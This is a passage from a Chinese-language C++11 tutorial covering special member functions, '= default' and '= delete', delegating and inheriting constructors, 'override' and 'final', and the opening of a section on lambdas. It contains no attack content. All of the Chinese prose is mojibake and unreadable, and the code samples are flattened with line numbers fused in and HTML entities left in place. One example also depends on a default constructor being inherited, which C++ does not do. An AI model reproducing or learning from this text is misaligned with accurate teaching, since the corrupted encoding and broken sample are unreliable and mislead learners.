ç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦ (Move Assignment Operator) (C++11): ç”Ÿæˆæ¡ä»¶ä¸ç§»åŠ¨æ„é€ å‡½æ•°ç±»ä¼¼ã€‚å®ƒæ‰§è¡Œé€æˆå‘˜ç§»åŠ¨ã€‚ è§„åˆ™æ€»ç»“ (Rule of Three/Five/Zero): Rule of Three (C++98): å¦‚æœä½ éœ€è¦æ˜¾å¼å®šä¹‰ææ„å‡½æ•°ã€å¤åˆ¶æ„é€ å‡½æ•°æˆ–å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦ä¸­çš„ä»»ä½•ä¸€ä¸ªï¼ˆé€šå¸¸æ˜¯å› ä¸ºç±»ç®¡ç†äº†éœ€è¦æ·±æ‹·è´æˆ–ç‰¹æ®Šæ¸…ç†çš„èµ„æºï¼‰ï¼Œé‚£ä¹ˆä½ å‡ ä¹è‚¯å®šéœ€è¦åŒæ—¶å®šä¹‰è¿™ä¸‰ä¸ªã€‚ Rule of Five (C++11): å¦‚æœä½ éœ€è¦æ˜¾å¼å®šä¹‰ä¸Šè¿°ä¸‰ä¸ªä¸­çš„ä»»ä½•ä¸€ä¸ªï¼Œæˆ–è€…æ˜¾å¼å®šä¹‰äº†ç§»åŠ¨æ„é€ å‡½æ•°æˆ–ç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦ï¼Œé‚£ä¹ˆä½ åº”è¯¥è€ƒè™‘å®šä¹‰æˆ–åˆ é™¤ (delete) æ‰€æœ‰äº”ä¸ªï¼ˆææ„ã€å¤åˆ¶æ„é€ ã€å¤åˆ¶èµ‹å€¼ã€ç§»åŠ¨æ„é€ ã€ç§»åŠ¨èµ‹å€¼ï¼‰ï¼Œä»¥ç¡®ä¿ç±»çš„è¡Œä¸ºç¬¦åˆé¢„æœŸã€‚å› ä¸ºæ˜¾å¼å®šä¹‰ä»»ä½•ä¸€ä¸ªå¤åˆ¶/ç§»åŠ¨/ææ„å‡½æ•°éƒ½ä¼šé˜»æ­¢ç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆç§»åŠ¨æ“ä½œã€‚ Rule of Zero (ç°ä»£ C++ æ¨è): å°½é‡è®¾è®¡ä½ çš„ç±»ï¼Œä½¿å…¶ä¸éœ€è¦è‡ªå®šä¹‰ææ„å‡½æ•°ã€å¤åˆ¶/ç§»åŠ¨æ„é€ å‡½æ•°æˆ–å¤åˆ¶/ç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦ã€‚è¿™é€šå¸¸é€šè¿‡ä½¿ç”¨ RAIIï¼ˆèµ„æºè·å–å³åˆå§‹åŒ–ï¼‰åŸåˆ™å’Œä¾èµ–æ ‡å‡†åº“ç»„ä»¶ï¼ˆå¦‚æ™ºèƒ½æŒ‡é’ˆ unique_ptr, shared_ptr å’Œå®¹å™¨ vector, stringï¼‰æ¥å®ç°ï¼Œè¿™äº›ç»„ä»¶å·²ç»æ­£ç¡®åœ°å¤„ç†äº†èµ„æºçš„å¤åˆ¶ã€ç§»åŠ¨å’Œé‡Šæ”¾ã€‚å¦‚æœéµå¾ª Rule of Zeroï¼Œç¼–è¯‘å™¨ç”Ÿæˆçš„é»˜è®¤ç‰ˆæœ¬é€šå¸¸å°±èƒ½æ­£å¸¸å·¥ä½œã€‚ 18.3.2 é»˜è®¤çš„æ–¹æ³•å’Œç¦ç”¨çš„æ–¹æ³• (= default, = delete)C++11 å…è®¸ä½ æ›´æ˜ç¡®åœ°æ§åˆ¶ç‰¹æ®Šæˆå‘˜å‡½æ•°çš„ç”Ÿæˆï¼š = default: æ˜¾å¼åœ°å‘Šè¯‰ç¼–è¯‘å™¨ç”Ÿæˆè¯¥ç‰¹æ®Šæˆå‘˜å‡½æ•°çš„é»˜è®¤å®ç°ã€‚å³ä½¿å› ä¸ºä½ å®šä¹‰äº†å…¶ä»–æ„é€ å‡½æ•°æˆ–ç§»åŠ¨æ“ä½œè€Œå¯¼è‡´ç¼–è¯‘å™¨åŸæœ¬ä¸ä¼šç”Ÿæˆå®ƒï¼Œ= default ä¹Ÿå¯ä»¥å¼ºåˆ¶ç”Ÿæˆé»˜è®¤ç‰ˆæœ¬ï¼ˆå¦‚æœå¯èƒ½çš„è¯ï¼‰ã€‚è¿™å¯¹äºå¸Œæœ›æ‹¥æœ‰é»˜è®¤è¡Œä¸ºä½†åˆéœ€è¦è‡ªå®šä¹‰å…¶ä»–æ„é€ å‡½æ•°çš„æƒ…å†µå¾ˆæœ‰ç”¨ã€‚ 12345678910111213class MyClassDefault &#123;public: MyClassDefault(int val) : data(val) &#123;&#125; // è‡ªå®šä¹‰æ„é€ å‡½æ•° // å³ä½¿å®šä¹‰äº†å…¶ä»–æ„é€ å‡½æ•°ï¼Œä»æ˜¾å¼è¦æ±‚ç¼–è¯‘å™¨ç”Ÿæˆé»˜è®¤æ„é€ å‡½æ•° MyClassDefault() = default; // æ˜¾å¼è¦æ±‚ç¼–è¯‘å™¨ç”Ÿæˆé»˜è®¤çš„å¤åˆ¶æ„é€ å‡½æ•° MyClassDefault(const MyClassDefault&amp;) = default; // ... å…¶ä»–ç‰¹æ®Šæˆå‘˜å‡½æ•°ä¹Ÿå¯ä»¥ = defaultprivate: int data;&#125;; = delete: æ˜¾å¼åœ°ç¦ç”¨æŸä¸ªæˆå‘˜å‡½æ•°ï¼ˆå¯ä»¥æ˜¯ç‰¹æ®Šæˆå‘˜å‡½æ•°ï¼Œä¹Ÿå¯ä»¥æ˜¯æ™®é€šæˆå‘˜å‡½æ•°ï¼‰ã€‚å¦‚æœä»£ç å°è¯•è°ƒç”¨è¢« = delete çš„å‡½æ•°ï¼Œç¼–è¯‘å™¨ä¼šæŠ¥é”™ã€‚è¿™å¸¸ç”¨äºé˜»æ­¢å¯¹è±¡çš„å¤åˆ¶æˆ–é˜²æ­¢ä¸æœŸæœ›çš„ç±»å‹è½¬æ¢ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;memory&gt; // for unique_ptrclass NonCopyable &#123;public: NonCopyable() = default; // ç¦ç”¨å¤åˆ¶æ„é€ å‡½æ•° NonCopyable(const NonCopyable&amp;) = delete; // ç¦ç”¨å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦ NonCopyable&amp; operator=(const NonCopyable&amp;) = delete; // ç§»åŠ¨æ“ä½œé€šå¸¸ä»å¯é»˜è®¤ç”Ÿæˆæˆ–æ˜¾å¼ default NonCopyable(NonCopyable&amp;&amp;) = default; NonCopyable&amp; operator=(NonCopyable&amp;&amp;) = default;&#125;;class ResourceManager &#123;private: std::unique_ptr&lt;int&gt; ptr; // unique_ptr æœ¬èº«æ˜¯ä¸å¯å¤åˆ¶çš„public: ResourceManager(int val) : ptr(std::make_unique&lt;int&gt;(val)) &#123;&#125; // ç”±äº unique_ptr ä¸å¯å¤åˆ¶ï¼Œç¼–è¯‘å™¨ä¸ä¼šç”Ÿæˆé»˜è®¤çš„å¤åˆ¶æ“ä½œ // æˆ‘ä»¬å¯ä»¥æ˜¾å¼ç¦ç”¨å®ƒä»¬ï¼Œä½¿æ„å›¾æ›´æ˜ç¡® ResourceManager(const ResourceManager&amp;) = delete; ResourceManager&amp; operator=(const ResourceManager&amp;) = delete; // ç§»åŠ¨æ“ä½œæ˜¯å…è®¸çš„ (unique_ptr å¯ç§»åŠ¨) ResourceManager(ResourceManager&amp;&amp;) = default; ResourceManager&amp; operator=(ResourceManager&amp;&amp;) = default; // é˜²æ­¢é€šè¿‡æ•´æ•°è¿›è¡Œéšå¼è½¬æ¢æ„é€  explicit ResourceManager(long long) = delete; // ç¦æ­¢ long long æ„é€ &#125;;int main() &#123; NonCopyable nc1; // NonCopyable nc2 = nc1; // ç¼–è¯‘é”™è¯¯ï¼å¤åˆ¶æ„é€ å‡½æ•°è¢«åˆ é™¤ // NonCopyable nc3; // nc3 = nc1; // ç¼–è¯‘é”™è¯¯ï¼å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦è¢«åˆ é™¤ ResourceManager rm1(10); // ResourceManager rm2 = rm1; // ç¼–è¯‘é”™è¯¯ï¼ ResourceManager rm3 = std::move(rm1); // OKï¼Œç§»åŠ¨æ„é€ å‡½æ•°æ˜¯é»˜è®¤çš„ // ResourceManager rm4(100LL); // ç¼–è¯‘é”™è¯¯ï¼long long æ„é€ å‡½æ•°è¢«åˆ é™¤ return 0;&#125; = default å’Œ = delete æé«˜äº†ä»£ç çš„æ¸…æ™°åº¦å’Œå¯¹ç±»è¡Œä¸ºçš„æ§åˆ¶åŠ›ã€‚ 18.3.3 å§”æ‰˜æ„é€ å‡½æ•°C++11 å…è®¸ä¸€ä¸ªæ„é€ å‡½æ•°è°ƒç”¨åŒä¸€ä¸ªç±»çš„å¦ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œè¿™ç§°ä¸º**å§”æ‰˜æ„é€ å‡½æ•° (Delegating Constructor)**ã€‚è¿™æœ‰åŠ©äºå‡å°‘æ„é€ å‡½æ•°ä¹‹é—´çš„ä»£ç é‡å¤ã€‚ è¢«å§”æ‰˜çš„æ„é€ å‡½æ•°ï¼ˆç›®æ ‡æ„é€ å‡½æ•°ï¼‰ä¼šå…ˆæ‰§è¡Œã€‚ ç›®æ ‡æ„é€ å‡½æ•°æ‰§è¡Œå®Œæ¯•åï¼Œå§”æ‰˜æ„é€ å‡½æ•°å‡½æ•°ä½“å†…çš„ä»£ç ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰æ‰ä¼šæ‰§è¡Œã€‚ å§”æ‰˜è°ƒç”¨å¿…é¡»å‡ºç°åœ¨æ„é€ å‡½æ•°çš„åˆå§‹åŒ–åˆ—è¡¨ä½ç½®ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &lt;string&gt;#include &lt;iostream&gt;class Report &#123;private: int id; std::string title; std::string content;public: // ç›®æ ‡æ„é€ å‡½æ•° (æ‰§è¡Œå®é™…åˆå§‹åŒ–) Report(int i, const std::string&amp; t, const std::string&amp; c) : id(i), title(t), content(c) &#123; std::cout &lt;&lt; &quot;Target constructor called (id=&quot; &lt;&lt; id &lt;&lt; &quot;).\\n&quot;; // ... å¯èƒ½è¿˜æœ‰å…¶ä»–åˆå§‹åŒ–é€»è¾‘ ... &#125; // å§”æ‰˜æ„é€ å‡½æ•° 1: æä¾›é»˜è®¤ content Report(int i, const std::string&amp; t) : Report(i, t, &quot;Default Content&quot;) &#123; // å§”æ‰˜ç»™ä¸‰ä¸ªå‚æ•°çš„æ„é€ å‡½æ•° std::cout &lt;&lt; &quot;Delegating constructor 1 called.\\n&quot;; // è¿™é‡Œå¯ä»¥æ·»åŠ æ­¤æ„é€ å‡½æ•°ç‰¹æœ‰çš„é€»è¾‘ &#125; // å§”æ‰˜æ„é€ å‡½æ•° 2: æä¾›é»˜è®¤ title å’Œ content Report(int i) : Report(i, &quot;Default Title&quot;) &#123; // å§”æ‰˜ç»™ä¸¤ä¸ªå‚æ•°çš„æ„é€ å‡½æ•° std::cout &lt;&lt; &quot;Delegating constructor 2 called.\\n&quot;; &#125; // å§”æ‰˜æ„é€ å‡½æ•° 3: æä¾›æ‰€æœ‰é»˜è®¤å€¼ Report() : Report(0) &#123; // å§”æ‰˜ç»™ä¸€ä¸ªå‚æ•°çš„æ„é€ å‡½æ•° std::cout &lt;&lt; &quot;Delegating constructor 3 (default) called.\\n&quot;; &#125; void print() const &#123; std::cout &lt;&lt; &quot;ID: &quot; &lt;&lt; id &lt;&lt; &quot;, Title: &quot; &lt;&lt; title &lt;&lt; &quot;, Content: &quot; &lt;&lt; content &lt;&lt; std::endl; &#125;&#125;;int main() &#123; std::cout &lt;&lt; &quot;Creating r1:\\n&quot;; Report r1(101, &quot;Monthly Report&quot;, &quot;Details...&quot;); // è°ƒç”¨ç›®æ ‡æ„é€  r1.print(); std::cout &lt;&lt; &quot;------\\n&quot;; std::cout &lt;&lt; &quot;Creating r2:\\n&quot;; Report r2(102, &quot;Weekly Update&quot;); // è°ƒç”¨å§”æ‰˜æ„é€  1 -&gt; ç›®æ ‡æ„é€  r2.print(); std::cout &lt;&lt; &quot;------\\n&quot;; std::cout &lt;&lt; &quot;Creating r3:\\n&quot;; Report r3(103); // è°ƒç”¨å§”æ‰˜æ„é€  2 -&gt; å§”æ‰˜æ„é€  1 -&gt; ç›®æ ‡æ„é€  r3.print(); std::cout &lt;&lt; &quot;------\\n&quot;; std::cout &lt;&lt; &quot;Creating r4:\\n&quot;; Report r4; // è°ƒç”¨å§”æ‰˜æ„é€  3 -&gt; å§”æ‰˜æ„é€  2 -&gt; å§”æ‰˜æ„é€  1 -&gt; ç›®æ ‡æ„é€  r4.print(); std::cout &lt;&lt; &quot;------\\n&quot;; return 0;&#125; å§”æ‰˜æ„é€ å‡½æ•°ä½¿å¾—åˆå§‹åŒ–é€»è¾‘å¯ä»¥é›†ä¸­åœ¨ä¸€ä¸ªæˆ–å°‘æ•°å‡ ä¸ªæ„é€ å‡½æ•°ä¸­ï¼Œå…¶ä»–æ„é€ å‡½æ•°åªéœ€æä¾›é»˜è®¤å€¼å¹¶å§”æ‰˜å³å¯ã€‚ 18.3.4 ç»§æ‰¿æ„é€ å‡½æ•°åœ¨ C++11 ä¹‹å‰ï¼Œå¦‚æœæ´¾ç”Ÿç±»æƒ³ä½¿ç”¨åŸºç±»çš„æ„é€ å‡½æ•°ï¼Œå®ƒå¿…é¡»åœ¨è‡ªå·±çš„æ„é€ å‡½æ•°åˆå§‹åŒ–åˆ—è¡¨ä¸­æ˜¾å¼è°ƒç”¨åŸºç±»æ„é€ å‡½æ•°ï¼Œå¹¶ä¸”ä¸ºæ¯ä¸ªéœ€è¦çš„åŸºç±»æ„é€ å‡½æ•°ç­¾åæä¾›ä¸€ä¸ªå¯¹åº”çš„æ´¾ç”Ÿç±»æ„é€ å‡½æ•°ã€‚ C++11 å…è®¸æ´¾ç”Ÿç±»ä½¿ç”¨ using å£°æ˜æ¥ç»§æ‰¿åŸºç±»çš„æ„é€ å‡½æ•°ï¼ˆä½†æœ‰ä¸€äº›ä¾‹å¤–ï¼Œå¦‚æ¶‰åŠè™šåŸºç±»çš„æ„é€ å‡½æ•°é€šå¸¸ä¸è¢«ç»§æ‰¿ï¼‰ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include &lt;string&gt;#include &lt;iostream&gt;class Base &#123;private: int value; std::string name;public: Base(int v, std::string n) : value(v), name(n) &#123; std::cout &lt;&lt; &quot;Base(int, string) called.\\n&quot;; &#125; Base(int v) : Base(v, &quot;DefaultName&quot;) &#123; // ä½¿ç”¨å§”æ‰˜æ„é€  std::cout &lt;&lt; &quot;Base(int) called.\\n&quot;; &#125; Base() : Base(0) &#123; // ä½¿ç”¨å§”æ‰˜æ„é€  std::cout &lt;&lt; &quot;Base() called.\\n&quot;; &#125; void display() const &#123; std::cout &lt;&lt; &quot;Base - Value: &quot; &lt;&lt; value &lt;&lt; &quot;, Name: &quot; &lt;&lt; name &lt;&lt; std::endl; &#125;&#125;;class Derived : public Base &#123;private: double extra_data;public: // ç»§æ‰¿ Base çš„æ‰€æœ‰æ„é€ å‡½æ•° using Base::Base; // ç¼–è¯‘å™¨ä¼šç”Ÿæˆå¯¹åº”çš„ Derived æ„é€ å‡½æ•°ï¼Œå®ƒä»¬è°ƒç”¨åŒ¹é…çš„ Base æ„é€ å‡½æ•° // å¯ä»¥æ·»åŠ æ–°çš„æ„é€ å‡½æ•°ï¼Œæˆ–è€…è¦†ç›–ç»§æ‰¿æ¥çš„æ„é€ å‡½æ•° (å¦‚æœç­¾åç›¸åŒ) Derived(double d) : Base(999, &quot;Special&quot;), extra_data(d) &#123; std::cout &lt;&lt; &quot;Derived(double) called.\\n&quot;; &#125; // å¦‚æœéœ€è¦å¯¹ç»§æ‰¿æ¥çš„æ„é€ å‡½æ•°æ·»åŠ é¢å¤–åˆå§‹åŒ–ï¼Œéœ€è¦æ˜¾å¼å®šä¹‰ // ä¾‹å¦‚ï¼Œå¦‚æœæƒ³è®© Derived(int) åˆå§‹åŒ– extra_data Derived(int v) : Base(v), extra_data(0.0) &#123; // æ˜¾å¼è°ƒç”¨åŸºç±»æ„é€ å¹¶åˆå§‹åŒ–æˆå‘˜ std::cout &lt;&lt; &quot;Derived(int) explicitly defined.\\n&quot;; &#125; void display_derived() const &#123; display(); // è°ƒç”¨åŸºç±»çš„ display std::cout &lt;&lt; &quot;Derived - Extra Data: &quot; &lt;&lt; extra_data &lt;&lt; std::endl; &#125;&#125;;int main() &#123; std::cout &lt;&lt; &quot;Creating d1:\\n&quot;; Derived d1(10, &quot;Object1&quot;); // è°ƒç”¨ç»§æ‰¿æ¥çš„ Base(int, string) å¯¹åº”çš„æ„é€ å‡½æ•° d1.display_derived(); std::cout &lt;&lt; &quot;------\\n&quot;; std::cout &lt;&lt; &quot;Creating d2:\\n&quot;; Derived d2(20); // è°ƒç”¨ Derived è‡ªå·±å®šä¹‰çš„ Derived(int) æ„é€ å‡½æ•° d2.display_derived(); std::cout &lt;&lt; &quot;------\\n&quot;; std::cout &lt;&lt; &quot;Creating d3:\\n&quot;; Derived d3; // è°ƒç”¨ç»§æ‰¿æ¥çš„ Base() å¯¹åº”çš„æ„é€ å‡½æ•° d3.display_derived(); std::cout &lt;&lt; &quot;------\\n&quot;; std::cout &lt;&lt; &quot;Creating d4:\\n&quot;; Derived d4(3.14); // è°ƒç”¨ Derived è‡ªå·±å®šä¹‰çš„ Derived(double) æ„é€ å‡½æ•° d4.display_derived(); std::cout &lt;&lt; &quot;------\\n&quot;; return 0;&#125; ç»§æ‰¿æ„é€ å‡½æ•°ç®€åŒ–äº†æ´¾ç”Ÿç±»çš„ç¼–å†™ï¼Œç‰¹åˆ«æ˜¯å½“åŸºç±»æœ‰å¤šä¸ªæ„é€ å‡½æ•°æ—¶ï¼Œé¿å…äº†ç¼–å†™å¤§é‡ä»…ä»…æ˜¯è½¬å‘å‚æ•°çš„æ´¾ç”Ÿç±»æ„é€ å‡½æ•°ã€‚ 18.3.5 ç®¡ç†è™šæ–¹æ³•ï¼šoverride å’Œ finalC++11 æä¾›äº†ä¸¤ä¸ªæ–°çš„**ä¸Šä¸‹æ–‡å…³é”®å­— (Contextual Keywords)**ï¼ˆåªåœ¨ç‰¹å®šä½ç½®æœ‰ç‰¹æ®Šå«ä¹‰ï¼Œå…¶ä»–åœ°æ–¹å¯ç”¨ä½œæ ‡è¯†ç¬¦ï¼‰æ¥å¸®åŠ©ç®¡ç†ç±»ç»§æ‰¿ä½“ç³»ä¸­çš„è™šå‡½æ•°ï¼šoverride å’Œ finalã€‚ override: æ˜¾å¼åœ°æ”¾åœ¨æ´¾ç”Ÿç±»ä¸­é‡å†™ (override) çš„è™šå‡½æ•°å£°æ˜æˆ–å®šä¹‰ä¹‹åã€‚ ä½œç”¨ï¼šè®©ç¼–è¯‘å™¨æ£€æŸ¥è¯¥å‡½æ•°æ˜¯å¦ç¡®å®è¦†ç›–äº†åŸºç±»ä¸­çš„æŸä¸ªè™šå‡½æ•°ï¼ˆå‡½æ•°ç­¾åã€const é™å®šç¬¦ã€å¼•ç”¨é™å®šç¬¦å¿…é¡»å®Œå…¨åŒ¹é…ï¼‰ã€‚ å¦‚æœæ´¾ç”Ÿç±»å‡½æ•°æ ‡è®°ä¸º override ä½†å¹¶æœªè¦†ç›–ä»»ä½•åŸºç±»è™šå‡½æ•°ï¼ˆä¾‹å¦‚å› ä¸ºæ‹¼å†™é”™è¯¯ã€å‚æ•°ç±»å‹ä¸åŒ¹é…ã€const ä¸åŒ¹é…ï¼‰ï¼Œç¼–è¯‘å™¨ä¼šæŠ¥é”™ã€‚ è¿™æœ‰åŠ©äºé˜²æ­¢å› æ„å¤–ç­¾åä¸åŒ¹é…è€Œå¯¼è‡´çš„è¦†ç›–å¤±è´¥ï¼ˆå˜æˆéšè—æˆ–å®šä¹‰æ–°å‡½æ•°ï¼‰ã€‚ final (ç”¨äºè™šå‡½æ•°): æ˜¾å¼åœ°æ”¾åœ¨æ´¾ç”Ÿç±»ä¸­é‡å†™çš„è™šå‡½æ•°å£°æ˜æˆ–å®šä¹‰ä¹‹åã€‚ ä½œç”¨ï¼šé˜»æ­¢ä»»ä½•åç»­çš„æ´¾ç”Ÿç±»è¿›ä¸€æ­¥è¦†ç›–è¿™ä¸ªè™šå‡½æ•°ã€‚ final (ç”¨äºç±»): æ”¾åœ¨ç±»å®šä¹‰çš„ class å…³é”®å­—ä¹‹åï¼Œç±»åä¹‹å‰æˆ–ä¹‹åã€‚ ä½œç”¨ï¼šé˜»æ­¢è¯¥ç±»è¢«ä»»ä½•å…¶ä»–ç±»ç»§æ‰¿ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;iostream&gt;class Document &#123;public: virtual void print() const &#123; std::cout &lt;&lt; &quot;Printing a generic document.\\n&quot;; &#125; virtual void save(const char* filename) &#123; std::cout &lt;&lt; &quot;Saving generic document to &quot; &lt;&lt; filename &lt;&lt; &quot;\\n&quot;; &#125; virtual ~Document() = default; // è™šææ„å‡½æ•°å¾ˆé‡è¦&#125;;// Report ç»§æ‰¿è‡ª Document// Report æœ¬èº«ä¹Ÿç¦æ­¢è¢«è¿›ä¸€æ­¥ç»§æ‰¿ (final class)class Report final : public Document &#123;public: // ä½¿ç”¨ override ç¡®ä¿æ­£ç¡®è¦†ç›– void print() const override &#123; // OKï¼Œè¦†ç›–äº†åŸºç±»çš„ print std::cout &lt;&lt; &quot;Printing a specific report.\\n&quot;; &#125; // void save(char* filename) override; // ç¼–è¯‘é”™è¯¯ï¼å‚æ•°ç±»å‹ const char* vs char* ä¸åŒ¹é… // ä½¿ç”¨ final é˜»æ­¢åç»­æ´¾ç”Ÿç±»è¦†ç›– save void save(const char* filename) override final &#123; std::cout &lt;&lt; &quot;Saving report securely to &quot; &lt;&lt; filename &lt;&lt; &quot;\\n&quot;; &#125; // void nonVirtualMethod() override; // ç¼–è¯‘é”™è¯¯ï¼åŸºç±»æ²¡æœ‰è¿™ä¸ªè™šå‡½æ•°&#125;;/*// ç¼–è¯‘é”™è¯¯ï¼Report è¢«æ ‡è®°ä¸º finalï¼Œä¸èƒ½è¢«ç»§æ‰¿class SpecialReport : public Report &#123;public: // ç¼–è¯‘é”™è¯¯ï¼save åœ¨ Report ä¸­è¢«æ ‡è®°ä¸º final // void save(const char* filename) override &#123; // std::cout &lt;&lt; &quot;Trying to save special report...\\n&quot;; // &#125;&#125;;*/int main() &#123; Document* doc1 = new Document(); Document* doc2 = new Report(); doc1-&gt;print(); // Output: Printing a generic document. doc2-&gt;print(); // Output: Printing a specific report. (å¤šæ€) doc1-&gt;save(&quot;doc.txt&quot;); doc2-&gt;save(&quot;report.txt&quot;); // è°ƒç”¨ Report::save delete doc1; delete doc2; return 0;&#125; override å’Œ final æé«˜äº†ä»£ç çš„å¥å£®æ€§å’Œå¯ç»´æŠ¤æ€§ï¼Œä½¿å¾—åœ¨å¤æ‚çš„ç»§æ‰¿ä½“ç³»ä¸­æ›´å®¹æ˜“æ­£ç¡®åœ°ç®¡ç†è™šå‡½æ•°ï¼Œå¹¶æ˜ç¡®è®¾è®¡æ„å›¾ã€‚ 18.4 Lambda å‡½æ•°C++11 å¼•å…¥äº†ä¸€ä¸ªéå¸¸å¼ºå¤§çš„ç‰¹æ€§ï¼šLambda è¡¨è¾¾å¼ (Lambda Expression)**ï¼Œé€šå¸¸ç®€ç§°ä¸º **Lambda å‡½æ•° æˆ– Lambdaã€‚Lambda è¡¨è¾¾å¼å…è®¸æˆ‘ä»¬åœ¨éœ€è¦å¯è°ƒç”¨å¯¹è±¡ï¼ˆå¦‚å‡½æ•°æŒ‡é’ˆã€å‡½æ•°å¯¹è±¡ï¼‰çš„åœ°æ–¹å°±åœ°å®šä¹‰ä¸€ä¸ªåŒ¿åçš„å‡½æ•°å¯¹è±¡ã€‚ Lambda çš„ä¸»è¦ç›®çš„æ˜¯æä¾›ä¸€ç§ç®€æ´çš„æ–¹å¼æ¥å®šä¹‰ç®€çŸ­çš„ã€é€šå¸¸åªåœ¨å±€éƒ¨èŒƒå›´å†…ä½¿ç”¨çš„å‡½æ•°æˆ–æ“ä½œï¼Œç‰¹åˆ«æ˜¯åœ¨å°†å®ƒä»¬ä½œä¸ºå‚æ•°ä¼ é€’ç»™ STL ç®—æ³•æ—¶ã€‚ Lambda è¡¨è¾¾å¼è¯­æ³•Lambda è¡¨è¾¾å¼çš„åŸºæœ¬è¯­æ³•å¦‚ä¸‹ï¼š 123[capture_clause](parameters) -&gt; return_type &#123; // function body&#125; [capture_clause] (æ•è·å­å¥): è¿™æ˜¯ Lambda è¡¨è¾¾å¼çš„å¼€å§‹ã€‚æ–¹æ‹¬å· [] ç”¨äºæŒ‡å®šå¦‚ä½•ä»å®šä¹‰ Lambda çš„å¤–éƒ¨ä½œç”¨åŸŸæ•è·å˜é‡ï¼ˆå³è®© Lambda å†…éƒ¨å¯ä»¥è®¿é—®å¤–éƒ¨å˜é‡ï¼‰ã€‚ []: ä¸æ•è·ä»»ä½•å¤–éƒ¨å˜é‡ã€‚ [=]: ä»¥å€¼æ‹·è´æ–¹å¼æ•è·æ‰€æœ‰å¤–éƒ¨ä½œç”¨åŸŸä¸­çš„è‡ªåŠ¨å˜é‡ï¼ˆå±€éƒ¨å˜é‡å’Œå‚æ•°ï¼‰ã€‚ [&amp;]: ä»¥å¼•ç”¨æ–¹å¼æ•è·æ‰€æœ‰å¤–éƒ¨ä½œç”¨åŸŸä¸­çš„è‡ªåŠ¨å˜é‡ã€‚ [var]: ä»¥å€¼æ‹·è´æ–¹å¼æ•è·æŒ‡å®šçš„å˜é‡ varã€‚ [&amp;var]: ä»¥å¼•ç”¨æ–¹å¼æ•è·æŒ‡å®šçš„å˜é‡ varã€‚ [this]: æ•è·å½“å‰å¯¹è±¡çš„ this æŒ‡é’ˆï¼ˆä»…åœ¨ç±»çš„éé™æ€æˆå‘˜å‡½æ•°å†…éƒ¨æœ‰æ•ˆï¼‰ã€‚ å¯ä»¥æ··åˆä½¿ç”¨ï¼Œä¾‹å¦‚ [=, &amp;var1, &amp;var2] (é»˜è®¤å€¼æ•è·ï¼Œä½† var1 å’Œ var2 å¼•ç”¨æ•è·)ï¼Œ[&amp;, var1, var2] (é»˜è®¤å¼•ç”¨æ•è·ï¼Œä½† var1 å’Œ var2 å€¼æ•è·)ã€‚ (parameters) (å‚æ•°åˆ—è¡¨): å¯é€‰ã€‚ä¸æ™®é€šå‡½æ•°çš„å‚æ•°åˆ—è¡¨ç±»ä¼¼ï¼Œå®šä¹‰ Lambda æ¥å—çš„å‚æ•°ã€‚å¦‚æœ Lambda ä¸éœ€è¦å‚æ•°ï¼Œå¯ä»¥çœç•¥ ()ã€‚ -&gt; return_type (è¿”å›ç±»å‹): å¯é€‰ã€‚ç”¨äºæ˜¾å¼æŒ‡å®š Lambda çš„è¿”å›ç±»å‹ã€‚å¦‚æœçœç•¥ï¼Œç¼–è¯‘å™¨ä¼šå°è¯•æ ¹æ®å‡½æ•°ä½“ä¸­çš„ return è¯­å¥è‡ªåŠ¨æ¨æ–­è¿”å›ç±»å‹ï¼ˆå¦‚æœå‡½æ•°ä½“åªæœ‰ä¸€ä¸ª return è¯­å¥ï¼Œæˆ–è€…æ‰€æœ‰ return è¯­å¥è¿”å›ç›¸åŒç±»å‹ï¼Œæˆ–è€…æ²¡æœ‰ return è¯­å¥åˆ™æ¨æ–­ä¸º voidï¼‰ã€‚å¦‚æœæ— æ³•æ¨æ–­æˆ–éœ€è¦ç‰¹å®šç±»å‹ï¼Œåˆ™å¿…é¡»æ˜¾å¼æŒ‡å®šã€‚ &#123; function body &#125; (å‡½æ•°ä½“): åŒ…å« Lambda æ‰§è¡Œçš„ä»£ç ï¼Œä¸æ™®é€šå‡½æ•°çš„å‡½æ•°ä½“ç±»ä¼¼ã€‚ æœ€ç®€å•çš„ Lambda: 1[]()&#123; std::cout &lt;&lt; &quot;Hello Lambda!\\n&quot;; &#125; // ä¸€ä¸ªä¸æ•è·ã€ä¸æ¥å—å‚æ•°ã€æ— è¿”å›å€¼çš„ Lambda Lambda çš„ç±»å‹: æ¯ä¸ª Lambda è¡¨è¾¾å¼éƒ½ä¼šç”Ÿæˆä¸€ä¸ªå”¯ä¸€çš„ã€æœªå‘½åçš„å‡½æ•°å¯¹è±¡ç±»å‹ã€‚è¿™æ„å‘³ç€å³ä½¿ä¸¤ä¸ª Lambda è¡¨è¾¾å¼çš„æ–‡æœ¬å®Œå…¨ç›¸åŒï¼Œå®ƒä»¬çš„ç±»å‹ä¹Ÿæ˜¯ä¸åŒçš„ã€‚ 123auto lambda1 = []()&#123;&#125;;auto lambda2 = []()&#123;&#125;;// decltype(lambda1) != decltype(lambda2) æˆ‘ä»¬å¯ä»¥å°† Lambda èµ‹å€¼ç»™ auto å˜é‡ï¼Œæˆ–è€…å­˜å‚¨åœ¨ std::function åŒ…è£…å™¨ä¸­ã€‚ 18.4.1 æ¯”è¾ƒå‡½æ•°æŒ‡é’ˆã€å‡½æ•°ç¬¦å’Œ Lambda å‡½æ•°åœ¨éœ€è¦ä¼ é€’å¯è°ƒç”¨å®ä½“çš„åœºæ™¯ï¼ˆå¦‚ STL ç®—æ³•ï¼‰ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‡½æ•°æŒ‡é’ˆã€å‡½æ•°å¯¹è±¡ï¼ˆå‡½æ•°ç¬¦ï¼‰æˆ– Lambda å‡½æ•°ã€‚ å‡½æ•°æŒ‡é’ˆ: 